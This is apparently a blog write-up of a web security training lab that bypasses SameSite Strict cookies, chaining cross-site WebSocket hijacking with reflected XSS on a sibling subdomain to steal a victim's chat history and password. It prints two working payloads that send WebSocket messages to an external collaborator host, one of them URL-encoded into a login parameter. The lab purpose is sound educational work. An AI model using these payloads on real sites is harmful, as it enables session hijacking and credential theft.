---
layout: post
title:  "SameSite Strict bypass via sibling domain"
date:   2024-10-13 12:20:54 +0530
---

## Objective 

This lab's live chat feature is vulnerable to cross-site WebSocket hijacking (CSWSH). To solve the lab, log in to the victim's account.

To do this, use the provided exploit server to perform a CSWSH attack that exfiltrates the victim's chat history to the default Burp Collaborator server. The chat history contains the login credentials in plain text.

## Solution

As mentioned in the lab objective, this is the chat function that is vulnerable to cross site websocket hijacking attack 

![]({{ site.baseurl }}/assets/images/csrf-36.png)

How we can exploit, this is simple POC that I built it 

```html
<script>
    var ws = new WebSocket('wss://0a68001a041224f68871cf4f00b40051.web-security-academy.net/chat');
    ws.onopen = function() {
        ws.send("READY");
    };
    ws.onmessage = function(event) {
        fetch('https://ixjsw8wfyq7abbvtx9s7sbls1j7av0jp.oastify.com', {method: 'POST', mode: 'no-cors', body: event.data});
    };
</script>
```

This is how it works, basically we are calling the chat and sending a `READY` message to the server meaning to establish the connection and if any connection establishes.. then messages passes between parties will be sent to external collab server which kinda performs a OOB interaction 

Then, Once after delivering the payload to victim we may see a collaborator pingback from the websocket server 

![]({{ site.baseurl }}/assets/images/csrf-37.png)

Now, url encoded the above code where we built it to trigger the OOB interaction into the following POC 

```html
<script>
    document.location = "https://cms-0a51004b0435faa1812061a800a300c2.web-security-academy.net/login?username=%3c%73%63%72%69%70%74%3e%0a%20%20%20%20%76%61%72%20%77%73%20%3d%20%6e%65%77%20%57%65%62%53%6f%63%6b%65%74%28%27%77%73%73%3a%2f%2f%30%61%35%31%30%30%34%62%30%34%33%35%66%61%61%31%38%31%32%30%36%31%61%38%30%30%61%33%30%30%63%32%2e%77%65%62%2d%73%65%63%75%72%69%74%79%2d%61%63%61%64%65%6d%79%2e%6e%65%74%2f%63%68%61%74%27%29%3b%0a%20%20%20%20%77%73%2e%6f%6e%6f%70%65%6e%20%3d%20%66%75%6e%63%74%69%6f%6e%28%29%20%7b%0a%20%20%20%20%20%20%20%20%77%73%2e%73%65%6e%64%28%22%52%45%41%44%59%22%29%3b%0a%20%20%20%20%7d%3b%0a%20%20%20%20%77%73%2e%6f%6e%6d%65%73%73%61%67%65%20%3d%20%66%75%6e%63%74%69%6f%6e%28%65%76%65%6e%74%29%20%7b%0a%20%20%20%20%20%20%20%20%66%65%74%63%68%28%27%68%74%74%70%73%3a%2f%2f%35%72%78%74%30%63%7a%76%35%70%34%77%66%30%36%66%77%34%76%35%35%66%6b%35%67%77%6d%6e%61%64%79%32%2e%6f%61%73%74%69%66%79%2e%63%6f%6d%27%2c%20%7b%6d%65%74%68%6f%64%3a%20%27%50%4f%53%54%27%2c%20%6d%6f%64%65%3a%20%27%6e%6f%2d%63%6f%72%73%27%2c%20%62%6f%64%79%3a%20%65%76%65%6e%74%2e%64%61%74%61%7d%29%3b%0a%20%20%20%20%7d%3b%0a%3c%2f%73%63%72%69%70%74%3e&password=anything";
</script>
```

Here, hwo it works.. we have separate subdomain called `cms` where it has login page which supports both `GET` and `POST` request login and it is vulnerable to XSS via `GET` method 

Pasted the above POC into the exploit server, `Stored it -> Deliver the exploit to victim` and then looking into our colllaborator we got the password of carlos 

![]({{ site.baseurl }}/assets/images/csrf-38.png)

With the password, we can just login as `carlos` and that solves the lab 